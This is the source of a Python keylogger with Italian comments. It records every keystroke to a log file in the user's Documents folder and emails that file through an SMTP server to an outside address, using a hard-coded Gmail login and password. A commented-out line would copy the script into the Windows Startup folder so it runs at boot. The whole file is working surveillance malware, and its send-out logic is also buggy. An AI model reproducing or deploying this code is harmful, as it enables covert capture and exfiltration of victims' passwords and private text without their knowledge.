# keylogger
from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile
# mail
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import time

# nome del login del sistema operativo
username = os.getlogin()
# directory in cui viene salvato il file che ci servirà
logging_directory = f"C:/Users/{username}/Documents"

# copia il file in una directori in cui verra avviato automaticamente all'avvio di windows
#copyfile('Keylogger.py', f"C:/Users/{username}/Appdata/Roaming/Microsoft/Start Manu/Startup/main.py")

# crea il file in cui scriverà
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

#cattura ogni tasto che premiamo
def key_headler(key):
    logging.info(key)
    while(time.time() % dopo == 0):
        server = smtplib.SMTP('64.233.184.108')
        server.ehlo()
        server.starttls()
        server.login('pieroangela827@gmail.com', 'piero728173py')

        msg = MIMEMultipart()
        msg['From'] = 'Keylogger'
        msg['To'] = 'dorak36267@pxjtw.com'
        msg['Subject'] = 'Ecco cosa ho salvato'

        msg.attach(MIMEText('Ecco a te', 'plain'))

        filename = 'C:/Users/anton/Documents/mylog.txt'
        attachment = open(filename, 'rb')

        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())

        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f'attachment; filename = {filename}')
        msg.attach(p)

        text = msg.as_string()
        server.sendmail('pieroangela827@gmail.com', 'dorak36267@pxjtw.com', text)

ora = time.time()
dopo = ora + 20

# ascolta i tasti che premiamo all'imfinito e li scrive nel file
with Listener(on_press=key_headler) as listener:
    listener.join()

    


